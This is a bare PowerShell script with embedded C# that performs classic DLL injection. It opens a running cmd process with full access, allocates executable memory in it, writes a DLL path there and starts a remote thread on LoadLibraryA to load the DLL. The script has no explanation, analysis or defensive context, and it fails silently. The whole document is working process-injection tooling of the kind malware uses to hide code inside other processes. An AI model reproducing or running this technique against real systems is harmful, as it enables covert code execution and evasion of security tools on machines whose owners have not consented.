$dllPath = "C:\Users\Pz\Documents\oi.dll"


if (-not (Test-Path $dllPath)) {
  
    exit
}


$processName = "cmd"
$process = Get-Process -Name $processName -ErrorAction SilentlyContinue
if (-not $process) {
 
    exit
}
$processId = $process.Id  # Renomeado para evitar conflito



function Inject-DLL {
    param (
        [int]$processId,  # Renomeado para evitar conflito
        [string]$dllPath
    )


    Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class Injector {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        public static bool Inject(string dllPath, int processId) {
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, processId); // PROCESS_ALL_ACCESS
            if (hProcess == IntPtr.Zero) return false;

            byte[] dllPathBytes = System.Text.Encoding.ASCII.GetBytes(dllPath + "\0");
            IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllPathBytes.Length, 0x1000 | 0x2000, 0x40); // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            if (allocMemAddress == IntPtr.Zero) {
                CloseHandle(hProcess);
                return false;
            }

            int bytesWritten;
            if (!WriteProcessMemory(hProcess, allocMemAddress, dllPathBytes, (uint)dllPathBytes.Length, out bytesWritten)) {
                CloseHandle(hProcess);
                return false;
            }

            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            if (loadLibraryAddr == IntPtr.Zero) {
                CloseHandle(hProcess);
                return false;
            }

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero) {
                CloseHandle(hProcess);
                return false;
            }

            CloseHandle(hThread);
            CloseHandle(hProcess);
            return true;
        }
    }
"@


    return [Injector]::Inject($dllPath, $processId)
}


$result = Inject-DLL -processId $processId -dllPath $dllPath  # Renomeado para evitar conflito
if ($result) {

} else {
  
}













